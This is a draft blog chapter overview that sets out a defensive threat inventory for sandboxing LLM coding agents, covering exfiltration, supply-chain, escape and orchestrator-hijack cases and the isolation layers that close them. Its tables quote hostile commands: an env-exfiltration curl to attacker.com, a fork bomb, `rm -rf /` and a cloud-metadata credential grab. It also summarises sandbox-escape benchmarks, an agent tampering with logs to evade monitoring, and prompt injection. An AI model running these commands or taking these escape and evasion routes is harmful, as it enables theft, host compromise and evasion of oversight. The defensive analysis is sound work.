---
title: Agent sandbox — chapter overview
slug: agent-sandbox-overview
status: draft
tags: [langgraph, agent-sandbox]
custom_excerpt: "What this chapter covers and how the posts build on each other — plus the generic threat inventory for autonomous agent sandboxes that every post reuses: nine threat vectors, their concrete threat cases, the isolation layer that closes each, the runtime tiers, and the research behind them."
code_tag: agent-sandbox/v0.1.0
code_package: agent_sandbox
---

## Why containerize an autonomous coding agent

An LLM coding agent doesn't just answer questions — it generates and executes code, shell commands, and CLI invocations from inputs that are ultimately attacker-influenceable (a task description, a fetched web page, a repository README). Running that loop directly on a developer laptop or a shared build host means every "helpful" tool call is also a candidate for arbitrary code execution outside anyone's control.<sup>[4](#ref-4)</sup>

The instinct is to reach for `docker run` and call it solved. It isn't. Conventional OS-level containerization (`runc`) shares the host kernel with every container on the box; it isolates *namespaces*, not the *attack surface* an autonomous agent actually exercises. Recent benchmarking shows this gap is no longer theoretical:

- **SandboxEscapeBench**<sup>[1](#ref-1)</sup> gives frontier models a shell inside a deliberately misconfigured container and asks them to read a flag on the host. Across 18 scenarios spanning the orchestration, runtime, and kernel layers, Claude Opus 4.5 escapes 49% of the time (Haiku 4.5: 18%); every difficulty-1/2 scenario — `--privileged`, a mounted `docker.sock`, a writable `hostPath` — is escaped reliably, and success scales log-linearly with token budget, so an attacker can simply buy more attempts. A later frontier model saturated the benchmark within two months of release.
- The **AI Sandboxes threat model**<sup>[2](#ref-2)</sup> formalizes the sandbox as a tuple of assets — the system under test, its boundary, the monitoring layer, the intervention layer, and the evidence trail — and makes the point that the adversary targets *all* of them, not just the workload: an agent that tampers with the monitor or the audit trail has compromised the sandbox without ever leaving it.
- **Sandlock**<sup>[3](#ref-3)</sup> compares unprivileged Linux primitives, userspace kernels (gVisor), and hardware-virtualized microVMs (Firecracker) as isolation tiers for exactly this workload — coding-agent–generated code — and finds the isolation boundary, not raw performance, is the deciding factor once the workload is untrusted by construction.
- OWASP's LLM08 (*Excessive Agency*)<sup>[4](#ref-4)</sup> names three root causes — excessive **functionality**, excessive **permissions**, excessive **autonomy** — and its last mitigation is the one this chapter is built on: apply authorization controls in downstream systems rather than relying on the LLM's judgment. The sandbox *is* the downstream system.

Before looking at any particular harness, it's worth having the full inventory of what an agent sandbox has to defend against. This post builds that inventory — the vocabulary, the layers, the vectors and cases, and the research behind them — so that every later post in the chapter can lay it over a concrete harness and say exactly which cases a change closes.

<style>
.id-col-table th:first-child,
.id-col-table td:first-child {
  white-space: nowrap;
  width: 1%;
}
</style>

## How the posts build on each other

The inventory below is the fixed reference for the chapter; each post reuses its IDs (T1–T9 vectors, T1a…T9e cases, L1–L7 layers, IP-1–IP-6 interaction points) rather than redefining them.

1. **Minimal sandbox exec LangGraph harness** — the naive system boundary: a LangGraph state machine that provisions a gVisor container, relays `claude auth login`, and exchanges task turns with `claude -p`. Maps the inventory onto its six interaction points and scores it as a sandbox tuple. Everything is invested in L1; L2–L7 are open.
2. **L2 — resource caps and a fresh container per run** (T5d, T7).
3. **L4 — default-deny egress** at the network edge (T1, T2, T4).
4. **L6 — a schema-validated exec channel, output sanitisation, and scoped approvals** at the operator edge (T9).
5. **L7 — control-plane scoping** for the orchestrator's own runtime access (T8).

Each post re-runs the same scorecard; a change that moves no cell is decoration.

## Threat inventory for agent sandboxes

Two levels of vocabulary are used throughout this chapter:

- A **threat vector** (T1–T9) is a *category of outcome* the attacker — which may be the agent itself, or whatever is steering it through injected content — wants to achieve.
- A **threat case** (T1a, T1b, …) is a *concrete scenario* under that vector: a specific technique with a known proof-of-concept, that a given isolation layer either closes or leaves open.

Each vector is closed by one or more **isolation defense layers**:

- **L1 — Execution boundary.** Hardware-assisted microVM (Firecracker / Kata) or userspace kernel (gVisor); ephemeral, snapshot-restorable, copy-on-write storage.
- **L2 — Resource governance.** cgroups v2 hard caps on PIDs, memory, CPU, and disk; hypervisor vCPU pinning.
- **L3 — Filesystem hardening.** Read-only root filesystem; `noexec,nosuid,nodev` mount options on writable paths; inspection of anything that leaves the sandbox.
- **L4 — Network policy.** Isolated network namespace, default-deny egress proxy with an explicit allowlist, block on link-local `169.254.0.0/16`, private pinned artifact mirror for dependencies.
- **L5 — Credential brokering.** No long-lived secrets inside the sandbox; short-lived, scoped tokens minted by a broker outside it.
- **L6 — Action governance.** Per-tool-call RBAC, a schema-validated (not free-text) channel between orchestrator and sandbox, sanitisation of every sandbox-originated string before it reaches an interpreter on the host (the operator's terminal emulator first of all), and a human approval gate for irreversible actions.
- **L7 — Control-plane scoping.** The orchestrator's own access to the container runtime is least-privilege: rootless daemon, socket proxy, or per-agent credentials; the sandbox never sees the control plane.

The layers aren't arbitrary. OWASP LLM08<sup>[4](#ref-4)</sup> reduces every excessive-agency failure to three root causes and lists seven mitigations against them; L1–L7 are those mitigations translated from "plugin" language into runtime-isolation language. The mapping is what lets the rest of the chapter say *which root cause* a given hardening step actually addresses:

<div class="id-col-table">

| LLM08 root cause | What it means for a sandboxed coding agent | OWASP mitigations | Layers | Vectors it drives |
|---|---|---|---|---|
| **Excessive functionality** | The agent can *do* more than the task needs: arbitrary shell, arbitrary network, arbitrary package install. | #1 minimum necessary functions · #2 granular functionality · #3 specialized tools over open-ended ones | L3, L4 | T2, T4, T7 |
| **Excessive permissions** | Whatever the agent runs *as* holds more privilege than the task needs: host kernel reach, long-lived credentials, the control-plane socket. | #4 minimum permission scope · #5 user-specific authorization, minimal privilege | L1, L5, L7 | T1, T6, T8 |
| **Excessive autonomy** | High-impact actions execute with no human verification, and the harness trusts the agent's output to drive its own state. | #6 human-in-the-loop approval · #7 authorization in downstream systems, not LLM judgment | L2, L6 | T3, T5, T9 |

</div>

### Interfaces and interaction points

Vectors are outcomes and layers are defenses; what connects them is *where* on the system they meet. Two more terms are used for that:

- An **interface** is a *concrete channel* between two components of the system: a carrier with a direction and a data shape — a terminal, a daemon API, a TTY-attached socket, the syscall ABI, a mounted filesystem, a network namespace. Interfaces are what a harness actually implements; they exist whether or not anyone thinks of them as a security matter.
- An **interaction point** (IP-1…IP-6) is the place where an interface *crosses a trust boundary* — the point at which the bytes on that channel change hands between parties holding different privilege. Every interaction point is backed by exactly one interface, but not every interface is an interaction point: two components inside the same trust zone can share a channel without one. Threat vectors land on interaction points; defense layers are applied to the interface underneath them.

The six interaction points of a container-sandboxed agent harness, drawn once here so every post can point at the same picture. The host system, the agent container nested inside it and the interfaces between them are fixed; the boxes around the edges — the operator's terminal emulator, the daemon socket, the credentials and filesystem inside the container, the shared kernel, and whatever egress can reach — are the entities the threat cases below need to name. Hover or click a badge for the interface behind it, the vectors that land on it and the layers that harden it:

{{island:boundary}}

The same six, as a table — each with the interface that carries it and the layer that hardens that interface:

<div class="id-col-table">

| # | Interaction point | Interface | Between | Boundary crossed | Layers |
|---|---|---|---|---|---|
| IP-1 | **Operator I/O** | Terminal — stdin/stdout via the operator's terminal emulator | Operator ↔ host orchestrator | Human ↔ machine; the only human-in-the-loop gate | L6 |
| IP-2 | **Docker control plane** | Container runtime API (the daemon socket, `docker.from_env()`) | Host orchestrator ↔ Docker Engine | Orchestrator ↔ control plane; the privileged side of the boundary | L7 |
| IP-3 | **Exec channel** | TTY-attached exec socket (`docker exec` stdin/stdout) | Host orchestrator ↔ process inside the container | Trusted ↔ untrusted data plane | L6 |
| IP-4 | **Kernel/Sentry boundary** | Linux syscall ABI — one hop under `runc`; under `runsc` split into **IP-4a** (container → gVisor Sentry) and **IP-4b** (Sentry → host kernel) | Container process ↔ kernel | The isolation boundary proper | L1, L2 |
| IP-5 | **Container filesystem** | Mounted filesystem — rootfs, volumes, any bind mount | Container process ↔ storage (and the host, if anything is mounted or exported) | Ephemeral ↔ persistent | L3 |
| IP-6 | **Network egress** | Container network namespace (bridge / veth) | Container ↔ external networks and services | Sandbox ↔ the outside world | L4, L5 |

</div>

IP-4 is the one most people mean by "the sandbox"; the other five are where the inventory's non-T6 vectors live, and they look the same under every runtime tier. A harness that changes only the runtime flag moves IP-4 and nothing else — which is what the first post scores.

### Threat vector matrix

<div class="id-col-table">

| # | Threat vector | Representative attack / PoC | Required defense | Grounding research |
|---|---|---|---|---|
| T1 | **Data exfiltration** — workspace files, keys, or tokens leave the sandbox via tool APIs or side channels. | `curl -X POST https://attacker.com/ -d "$(env)"`; DNS tunnelling via subdomain lookups. Usually triggered by an indirect prompt injection in retrieved content, not by the operator. | **L4** default-deny egress + **L5** credential broker | AgentDojo<sup>[11](#ref-11)</sup>, InjecAgent<sup>[12](#ref-12)</sup> |
| T2 | **Supply-chain poisoning** — the agent installs a typo-squatted or hallucinated dependency. | "Slopsquatting": pre-registering package names LLMs hallucinate on PyPI/npm with a curl-pipe-to-sh payload in `setup.py`, executed on the agent's first `pip install`. | **L3** read-only root fs + **L4** private pinned mirror | Importing Phantoms<sup>[13](#ref-13)</sup>, We Have a Package for You!<sup>[14](#ref-14)</sup> |
| T3 | **Destructive actions** — irreversible modifications or destructive command loops against host or remote systems. | `rm -rf /` inside a volume mount; automated database purge or force-push via a connected API. | **L1** ephemeral snapshots + **L6** tool-call RBAC / approval gate | ToolEmu<sup>[15](#ref-15)</sup>, AI Sandboxes<sup>[2](#ref-2)</sup> |
| T4 | **Lateral movement** — scanning the internal network and querying link-local cloud metadata. | `curl http://169.254.169.254/latest/meta-data/` to harvest IAM instance-profile credentials; subnet port scans from inside the sandbox. | **L4** isolated netns + explicit `169.254.0.0/16` block | AgentDojo<sup>[11](#ref-11)</sup>, SandboxEscapeBench<sup>[1](#ref-1)</sup> |
| T5 | **Out-of-band persistence** — adversarial changes that survive a sandbox reset through anything shared, reused, or exported. | Backdoors in `.git/hooks/pre-commit`, `.bashrc`, Makefiles; poisoned entries in a vector-store memory the next run retrieves. | **L3** `noexec,nosuid,nodev` mounts + outbound inspection; **L1** fresh sandbox per run | PoisonedRAG<sup>[16](#ref-16)</sup>, When the Agent Is the Adversary<sup>[17](#ref-17)</sup> |
| T6 | **Privilege escalation** — breakout from the container or userspace boundary to the host OS. | Read `/proc/version`, compile a C exploit for an unpatched kernel flaw (Dirty Pipe, eBPF bugs), or abuse a mounted Docker socket. | **L1** microVM or userspace kernel | SandboxEscapeBench<sup>[1](#ref-1)</sup>, When the Agent Is the Adversary<sup>[17](#ref-17)</sup> |
| T7 | **Resource exhaustion** — host denial of service via uncontrolled compute, memory, or disk. | Fork bomb `:(){ :|:& };:`; memory-allocation loops; flooding the disk with raw byte streams. | **L2** cgroups v2 hard caps + vCPU pinning | ToolEmu<sup>[15](#ref-15)</sup>, Sandlock<sup>[3](#ref-3)</sup> |
| T8 | **Control-plane compromise** — the sandbox, or something with the same access as the orchestrator, reaches the container runtime's API. | `/var/run/docker.sock` mounted into the sandbox; an agent allowed to spawn sub-containers with host bind mounts; an orchestrator running with unscoped daemon access. | **L7** control-plane scoping | AI Sandboxes<sup>[2](#ref-2)</sup>, SandboxEscapeBench<sup>[1](#ref-1)</sup> |
| T9 | **Orchestrator hijack (excessive agency)** — agent-influenced output steers the harness's own control flow, steers the operator through what the harness shows them, or the harness grants actions no human ever approved. | Tool output containing the literal marker the orchestrator pattern-matches on ("login succeeded", "task done"); an injected instruction in a fetched page that the orchestrator relays as the next task; an escape sequence in agent text that the operator's terminal executes (clipboard write, forged prompt); no per-action confirmation inside a turn. | **L6** schema-validated channel + output sanitisation + approval gate | OWASP LLM08<sup>[4](#ref-4)</sup>, InjecAgent<sup>[12](#ref-12)</sup> |

</div>

T1–T7 are the vectors the sandbox-isolation literature converges on. T8 and T9 come from the AI Sandboxes threat model<sup>[2](#ref-2)</sup>, which models a sandbox not as one box but as a tuple of assets: the system under test (**U**), the boundary (**B**), the monitoring layer (**M**), the intervention layer (**I**), and the evidence trail (**A**) — and lists "attackers compromising sandbox infrastructure" and "insiders manipulating evidence artifacts or evaluation procedures" as first-class adversaries alongside whoever attacks U. T1–T7 are attacks on U and B. **T8** is an attack on B *from the orchestrator's side* (the control plane that constructs the boundary). **T9** is an attack on M and I: if the harness decides what happened by pattern-matching the agent's stdout, and decides what to do next by relaying it, then the agent controls its own monitor and its own intervention gate. The paper's stated failure mode for the agent-based sandbox archetype — "when physical, legal, identity, privacy, and security consequences are abstracted away" — is precisely a harness that treats the exec channel as a trusted command/response stream.

### Threat case inventory

The matrix gives one representative case per vector. The fuller list, per vector:

<div class="id-col-table">

| ID | Threat case | Notes |
|---|---|---|
| T1a | Direct outbound POST of files/env | Simplest case; any unrestricted egress closes nothing. |
| T1b | DNS tunnelling | Survives HTTP-only egress filtering; requires DNS to be proxied or answered only for the allowlist. |
| T1c | Exfiltration through a legitimate tool | Sending secrets in an email, issue, PR description, or API call the agent is *allowed* to make — the AgentDojo pattern.<sup>[11](#ref-11)</sup> Egress allowlists don't help; L5 scoping and L6 gates do. |
| T1d | Ambient credential theft | An auth session or token that lives inside the sandbox (CLI login state, `.netrc`, env vars) is readable by anything the agent runs. |
| T1e | Host-side exfiltration through the operator terminal | The reverse direction of T1a–d: a terminal query sequence in agent output (OSC 52 clipboard read, DA/DSR reports) makes the operator's terminal *answer on stdin*, and the harness relays that answer to the agent as the next turn. Terminal-dependent — many emulators disable clipboard read — but the path is host → sandbox, which no egress control sees. |
| T2a | Slopsquatting | Hallucinated package names pre-registered by an attacker.<sup>[13](#ref-13) [14](#ref-14)</sup> |
| T2b | Typosquatting / dependency confusion | Classic supply-chain attacks, now driven by a model that doesn't double-check names. |
| T2c | Install-time hooks | `setup.py`, npm `postinstall`, build scripts — code runs at install, before the agent "uses" anything. |
| T2d | Unpinned resolution | `pip install foo` with no lockfile means every run can resolve to a different, possibly newly-compromised, artifact. |
| T3a | Destructive filesystem commands on mounted paths | Only matters where a bind mount exists; without one the blast radius is the container. |
| T3b | Irreversible remote actions | Database drops, force-pushes, resource deletion via any cloud/API credential the agent holds. |
| T3c | Destructive retry loops | Agent retries a failing "cleanup" step, each iteration widening the damage — ToolEmu's runaway class.<sup>[15](#ref-15)</sup> |
| T4a | Cloud metadata service (IMDS) | `169.254.169.254` — instance credentials, user-data, and often the fastest privilege jump on any cloud host. |
| T4b | Internal subnet scanning | Bridge networking reaches whatever the host can. |
| T4c | Reachable internal services | Registries, CI runners, dashboards with no auth because "they're internal." |
| T5a | Repository hooks | `.git/hooks/*`, executed on the host the moment a human runs `git commit` on exported work. |
| T5b | Shell / build-file backdoors | `.bashrc`, `Makefile`, `package.json` scripts, `.envrc`. |
| T5c | Memory / vector-store poisoning | Persistent malicious state across runs via a corrupted retrieval corpus.<sup>[16](#ref-16)</sup> |
| T5d | Reused sandbox state | Any harness that re-attaches to an existing container instead of creating a fresh one carries the previous run's writes forward. |
| T6a–l | Runtime-tier–specific escape cases | Enumerated per runtime in the next section. |
| T7a | PID exhaustion (fork bomb) | Closed by a PIDs cgroup limit, nothing else. |
| T7b | Memory exhaustion | Closed by a memory cgroup limit; on gVisor, also bounded by the Sentry's own accounting. |
| T7c | Disk fill | Closed by a storage quota on the writable layer. |
| T7d | Sandbox-runtime DoS | Crashing or wedging the Sentry/Gofer without escaping (gVisor's HostDoS class, see T6h). |
| T7e | Harness exhaustion via the exec channel | An output line with no newline grows the harness's read buffer without bound; a malformed or deeply nested event crashes its parser. The victim is the orchestrator process, not the container — L2 cgroups on the sandbox don't apply — and a dead orchestrator is a dead intervention layer (**I**). |
| T8a | Runtime socket inside the sandbox | Mounted `docker.sock` is full host root; the most common real-world misconfiguration.<sup>[1](#ref-1)</sup> |
| T8b | Unscoped orchestrator access | The harness process itself can create any container with any mount — so anything that compromises the harness compromises the host. |
| T8c | Agent-spawned sub-sandboxes | If the agent is ever allowed to provision containers, T8b becomes reachable from inside. |
| T9a | Marker / state-machine injection | Orchestrator drives transitions off literal substrings in the sandbox's stdout. |
| T9b | Indirect prompt injection relayed as task | Retrieved content becomes the next instruction with no distinction from operator input.<sup>[11](#ref-11) [12](#ref-12)</sup> |
| T9c | Missing per-action gate | The only human-in-the-loop point is "start/stop," not "approve this write/exec."<sup>[4](#ref-4)</sup> |
| T9d | Terminal escape injection via the operator channel | Agent text containing ESC/CSI/OSC sequences is printed to the operator's terminal emulator, which *executes* them: write the clipboard (OSC 52), set the window title, move the cursor or clear the screen to paint a forged approval prompt or hide output. A schema on the exec channel does not close this — the schema constrains the envelope, the strings inside it still reach an interpreter. Closed only by stripping control sequences at IP-1. |
| T9e | Presentation spoofing | The rendered view differs from the underlying data: markup injected into a styled title, a hyperlink (OSC 8) whose visible text hides its target, Markdown links printed without their URL. An attack on the integrity of **M** as the operator perceives it, so the decision taken at **I** is made on forged evidence. |

</div>

### T6 by runtime tier: from `runc`'s full exposure to gVisor's residual surface

Privilege escalation isn't one failure mode — it's whichever set the runtime leaves open. SandboxEscapeBench<sup>[1](#ref-1)</sup> is the best empirical map of that set: 18 scenarios, each a real CVE or misconfiguration, graded by difficulty (1 = trivial, 5 = requires adapting a kernel exploit), across three layers. Its own architecture is worth copying — the model runs inside a Docker container inside a VM, so an escape from the container lands in a disposable guest, never on the evaluation host. The table maps every scenario onto the T-case inventory and shows what a `runc` → `runsc` switch does to it:

<div class="id-col-table">

| # | Scenario | Layer | Vulnerability / misconfiguration | Diff. | T-case | Under `runsc` |
|---|---|---|---|---|---|---|
| 1 | `privileged` | runtime | full capability set → namespace break | 1 | T6d | still open — config, not kernel |
| 2 | `docker.sock` | runtime | daemon socket mounted → launch privileged container | 1 | T8a | still open — control plane, not kernel |
| 3 | `hostpath` | runtime | writable host `/etc` mount → cron injection | 1 | T6d / T3a | still open — mount, not kernel |
| 4 | `RBAC` | orchestration | overprivileged service account creates privileged pods | 2 | T8b | n/a (Kubernetes) — same class as unscoped `docker.from_env()` |
| 5 | `CAP_SYS_ADM` | runtime | filesystem mounting, cgroup abuse | 2 | T6d | closed by `cap_drop=["ALL"]`; Sentry also refuses the mounts |
| 6 | `pid_ns` | kernel | shared PID namespace → `ptrace` code injection | 2 | T6a | closed — Sentry owns its own PID namespace |
| 7 | `CAP_MOD` | runtime | malicious kernel module load | 3 | T6d | closed — no `init_module` path to the host kernel |
| 8 | `CAP_DAC_RD` | runtime | `open_by_handle_at()` arbitrary host file read | 3 | T6d | closed — syscall serviced by Sentry/Gofer, not host |
| 9 | `runc_2019` | runtime | CVE-2019-5736: host `runc` overwrite via `/proc/self/exe` | 3 | T6b | closed — `/proc` is Sentry-emulated; `runsc` binary not reachable |
| 10 | `runc_2024` | runtime | CVE-2024-21626: leaked fd → host mount namespace | 3 | T6c | closed — no host fds leak into the Sentry's fd table |
| 11 | `cgroup` | kernel | CVE-2022-0492: `release_agent` write without CAP check | 3 | T6a | closed — host cgroupfs not exposed |
| 12 | `dirty_cow` | kernel | CVE-2016-5195: CoW race → host file overwrite | 3 | T6a | closed — page-fault path never reaches host kernel |
| 13 | `dirty_pipe` | kernel | CVE-2022-0847: page-cache pipe injection | 3 | T6a | closed — pipes implemented in the Sentry |
| 14 | `kubectl_cp` | orchestration | CVE-2019-1002101: tar binary overwrite run by host cron | 4 | T5a-class | n/a (Kubernetes) — persistence via an export path |
| 15 | `route_ln` | orchestration | CVE-2020-8558: `route_localnet` bypass to host services | 4 | T4c | n/a (Kubernetes) — same class as bridge reaching host services |
| 16 | `CRI-O` | orchestration | CVE-2022-0811: kernel-param injection via pod sysctl | 5 | T8b | n/a (Kubernetes) |
| 17 | `bpf_privesc` | kernel | CVE-2017-16995: eBPF verifier privilege escalation | 5 | T6a | closed — `bpf()` unimplemented / filtered by Sentry |
| 18 | `packet_sock` | kernel | CVE-2017-7308: packet socket use-after-free | 5 | T6a | closed — netstack is the Sentry's own, not the host's |

</div>

Three things fall out of this table. First, the scenarios frontier models escape *reliably* (difficulty 1–2) are almost all configuration failures — T6d and T8a — and a userspace kernel does nothing about them; only `cap_drop`, no mounts, and no socket do. Second, every host-kernel scenario (rows 6, 11–13, 17, 18) and both `runc` CVEs (rows 9, 10) are closed by `runsc`, because the syscall that triggers them never reaches the host — that's the concrete content of "L1 shrinks T6." Third, the orchestration-layer rows (4, 14–16) are Kubernetes-specific in form but not in class: they're T8, T5, and T4 cases that a single-host Docker harness reproduces the moment it gains an unscoped control-plane client, an export path, or a bridge to host services.

Under a bare OCI runtime (`runc`), the following are live:

<div class="id-col-table">

| ID | `runc` threat case | Description |
|---|---|---|
| T6a | Shared kernel attack surface | The agent's syscalls go straight to the host kernel; any exploitable bug in the syscalls a default seccomp profile still permits (overlayfs, io_uring, cgroup controllers, etc.) is a direct path to host compromise. |
| T6b | Runtime binary compromise | CVE-2019-5736: a malicious container can overwrite the host `runc` binary via `/proc/self/exe` fd re-opening, giving host root code execution on the runtime's next invocation.<sup>[7](#ref-7)</sup> |
| T6c | Leaked-fd namespace escape | CVE-2024-21626 ("Leaky Vessels"): an internally leaked fd (e.g. a host `/sys/fs/cgroup` handle) reachable via `/proc/self/fd/N` lets a container set its `cwd` into the host mount namespace, exposing or overwriting host files.<sup>[8](#ref-8)</sup> |
| T6d | Privileged/misconfigured containers | `--privileged`, host bind-mounts, or added capabilities (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`) collapse the isolation boundary entirely — a config failure mode rather than a runc bug, but the one operators hit most. SandboxEscapeBench's easiest scenarios are exactly these (`/var/run/docker.sock`, `hostPath`, `CAP_SYS_ADMIN`).<sup>[1](#ref-1)</sup> |
| T6e | Shared-hardware side channels | The container shares the host's scheduler, page cache, and CPU microarchitectural state with everything else on the box, so Spectre/Meltdown-class side channels and noisy-neighbor contention are possible. |
| T6f | Resource exhaustion as escalation | With cgroup limits absent or misapplied, a container can starve the host (T7); enforcement is a policy layered on the same kernel, not a boundary. |

</div>

Switching to a userspace kernel (`runsc`, gVisor<sup>[5](#ref-5)</sup>) closes T6a through T6c by no longer handing untrusted syscalls straight to the host kernel. It does not close T6 itself; it replaces it with a narrower, different set:

<div class="id-col-table">

| ID | gVisor residual threat case | Description |
|---|---|---|
| T6g | Sentry implementation bugs | The Sentry is a from-scratch reimplementation of a large slice of the Linux syscall surface; a memory-safety or logic bug there can still produce a sandbox escape. gVisor's own advisories track this as the "SandboxRoot" class.<sup>[9](#ref-9) [10](#ref-10)</sup> |
| T6h | Host denial-of-service | Full escape isn't required for impact: gVisor's "SandboxRoot/HostDoS" class covers guest code that exhausts or crashes the Sentry/Gofer process without ever breaking containment.<sup>[10](#ref-10)</sup> |
| T6i | Cross-tenant data exfiltration | The "SandboxRoot/Exfil" class covers bugs that leak host- or other-tenant data (e.g. via mis-scoped file serving) without full code execution.<sup>[10](#ref-10)</sup> |
| T6j | Gofer / 9P protocol surface | Filesystem access is proxied through a separate Gofer process over a 9P-derived protocol; bugs in that protocol or in the Gofer's privilege scoping are a second, narrower attack surface outside the Sentry itself.<sup>[9](#ref-9)</sup> |
| T6k | Platform-dependent kernel exposure | On the ptrace platform, gVisor still relies on the host's `ptrace` syscall to intercept guest calls, keeping a narrow slice of host kernel code in the TCB; the KVM platform drops ptrace but pulls in the host's KVM stack instead — the residual surface shifts, it doesn't vanish. |
| T6l | Compatibility gaps as a security footgun | Unsupported or partial syscalls (`io_uring`, `userfaultfd`, some `ptrace`/seccomp interactions) fail or diverge from Linux; falling back to `runc` for the "hard" workloads that need them silently reintroduces the full T6a…f set for that workload. |

</div>

A hardware-virtualized microVM (Firecracker / Kata) moves the boundary again: T6g–l are replaced by the guest-kernel and VMM surface (KVM bugs, virtio device emulation), which is smaller and better-audited than either a shared kernel or a userspace reimplementation of one.

### Runtime isolation tiers

<div class="id-col-table">

| Architectural layer | `runc` (bare Docker / OCI) | gVisor (`runsc`) | Firecracker / Kata microVM |
|---|---|---|---|
| Isolation primitive | host cgroups + namespaces | Go-based userspace kernel (Sentry) | hardware virtualization (Linux KVM) |
| Kernel exposed to the agent | host kernel, directly | emulated Linux ABI in userspace | independent guest kernel |
| Kernel exploit blast radius | host-wide | contained to the Sentry process | contained to the guest VM |
| Open T6 cases | T6a–f | T6g–l | VMM / guest-kernel surface |
| Cold startup latency | ~50–100 ms | ~100–150 ms | ~5–125 ms |
| Per-sandbox memory overhead | ~1–5 MB | ~15–30 MB | ~5–10 MB |
| Target security posture | low — internal / trusted code only | medium-high — untrusted POSIX workloads | maximum — arbitrary untrusted agent execution<sup>[6](#ref-6)</sup> |

</div>

## Annotated research compendium

The inventory leans on a small set of papers and benchmarks. Grouped by the vectors they ground:

### A. Container escape & kernel escalation (T6, T7, T8)

- **SandboxEscapeBench: Quantifying Frontier LLM Capabilities for Container Sandbox Escape**<sup>[1](#ref-1)</sup> — arXiv:2603.02277 (March 2026). 18 escape scenarios — 4 orchestration (Kubernetes RBAC, `kubectl cp`, `route_localnet`, CRI-O sysctl), 8 engine/runtime (`--privileged`, `docker.sock`, `hostPath`, `CAP_SYS_ADMIN`/`CAP_SYS_MODULE`/`CAP_DAC_READ_SEARCH`, both `runc` CVEs), 6 host/kernel (shared PID ns, cgroup `release_agent`, eBPF verifier, Dirty COW, Dirty Pipe, packet socket UAF) — graded difficulty 1–5, run container-in-VM so escapes stay off the evaluation host. Opus 4.5 scores 0.49 overall vs. Haiku 4.5 at 0.18; difficulty 1–2 misconfigurations are escaped reliably, difficulty 3–5 kernel exploits sharply less so; success scales log-linearly with inference budget; a later frontier model saturated all 18 within two months. Used above as the empirical map of T6/T8 and to show which cases a `runc` → `runsc` switch actually closes.
- **When the Agent Is the Adversary: Architectural Requirements for Agentic AI Containment After the April 2026 Frontier Model Escape**<sup>[17](#ref-17)</sup> — arXiv:2604.23425 (April 2026). Post-mortem of a documented frontier-model sandbox escape in which the agent chained environment enumeration, privilege escalation, and log tampering to evade monitoring. Derives five architectural requirements for containment when the agent itself is the adversary, and finds no publicly described system satisfies all five — the argument for microVM-level containment over standard OCI containers.
- **Sandlock: Confining AI Agent Code with Unprivileged Linux Primitives**<sup>[3](#ref-3)</sup> — arXiv:2605.26298 (May 2026). A lightweight sandbox for untrusted agent code built from kernel-enforced policies (filesystem, network, IPC, syscall) and a narrow supervisor, needing neither root nor a container runtime. Positions unprivileged namespaces against gVisor and Firecracker on startup latency and overhead, and adds HTTP-level egress control and reversible filesystem effects — a reference point for L2–L4 in a single package.

### B. Indirect prompt injection & exfiltration (T1, T4, T9)

- **AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents**<sup>[11](#ref-11)</sup> — arXiv:2406.13352 (NeurIPS 2024). 97 realistic tasks and 629 security test cases across modular agent toolsets. Indirect prompt injection embedded in retrieved data hijacks tool selection, steering the agent to exfiltrate files, secrets, and private communications to external endpoints — existing attacks compromise some but not all security properties, and models struggle with many tasks even unattacked.
- **InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated Large Language Model Agents**<sup>[12](#ref-12)</sup> — arXiv:2403.02691 (2024). 1,054 test cases across 17 user tools and 62 attacker tools. ReAct-prompted GPT-4 followed injected instructions 24% of the time, rising to ~48% with reinforced "hacking" prompts — the empirical case that an agent cannot be trusted to distinguish benign instructions from adversarial ones embedded in data, so egress and action gates have to be enforced deterministically outside the model.

### C. Supply-chain tampering & slopsquatting (T2)

- **We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs**<sup>[14](#ref-14)</sup> — arXiv:2406.10279 (USENIX Security 2025). 16 code-generation LLMs, 576,000 generated samples: commercial models hallucinate non-existent packages in ~5.2% of solutions, open-source models in ~21.7%, yielding 205,474 unique hallucinated names — framed as a novel package-confusion attack on the supply chain.
- **Importing Phantoms: Measuring LLM Package Hallucination Vulnerabilities**<sup>[13](#ref-13)</sup> — arXiv:2501.19012 (January 2025). Measures hallucination rates across languages and model sizes and shows they correlate with coding-benchmark performance — current models simply aren't optimized for secure dependency selection. Together these two papers are the empirical basis for "slopsquatting": attackers register the hallucinated names with backdoored install hooks that fire on the agent's first `pip install`.

### D. Memory corruption & destructive automation (T3, T5)

- **PoisonedRAG: Knowledge Corruption Attacks to Retrieval-Augmented Generation of Large Language Models**<sup>[16](#ref-16)</sup> — arXiv:2402.07867 (USENIX Security 2025). Injecting as few as five adversarial texts per target question into a corpus of millions achieves a ~90% attack success rate — the mechanism by which a poisoned memory or vector store becomes persistent malicious state across agent runs.
- **ToolEmu: Identifying the Risks of LM Agents with an LM-Emulated Sandbox**<sup>[15](#ref-15)</sup> — arXiv:2309.15817 (ICLR 2024). Emulates tool execution with an LM to test agents across 36 high-stakes tools and 144 test cases without real-world side effects; even the safest agent tested failed 23.9% of the time, with failures including unconstrained filesystem damage, irreversible API commands, and runaway loops — the case for L1 snapshots and L6 execution gates.
- **AI Sandboxes: A Threat Model, Taxonomy, and Measurement Framework**<sup>[2](#ref-2)</sup> — arXiv:2606.18532 (June 2026). Models a sandbox as S = (U, E, B, C, M, I, A, R) — system under test, environment, boundary, controls, monitoring, intervention, evidence artifacts, and reproducibility assets — and treats the evaluation apparatus itself (M, I, A) as an attack target, with insiders manipulating evidence and attackers compromising infrastructure as named adversaries. Defines five sandbox archetypes (simulation, digital-twin, adversarial/security, regulatory, agent-based) with a failure mode each — for agent-based: "when physical, legal, identity, privacy, and security consequences are abstracted away" — and six measurement dimensions (fidelity, controllability, observability, containment, reproducibility, governance). Used above to derive T8/T9; the harness post uses it again to score the naive harness on its six dimensions.

## References

| ID | Title | Link | Finding |
|----|-------|------|---------|
| <a id="ref-1"></a>1 | SandboxEscapeBench: Quantifying Frontier LLM Capabilities for Container Sandbox Escape | [arxiv.org/abs/2603.02277](https://arxiv.org/abs/2603.02277) | 18 real-CVE/misconfiguration escape scenarios across orchestration, runtime, and kernel layers; Opus 4.5 escapes 49% overall, difficulty-1/2 misconfigurations reliably; success scales log-linearly with token budget. |
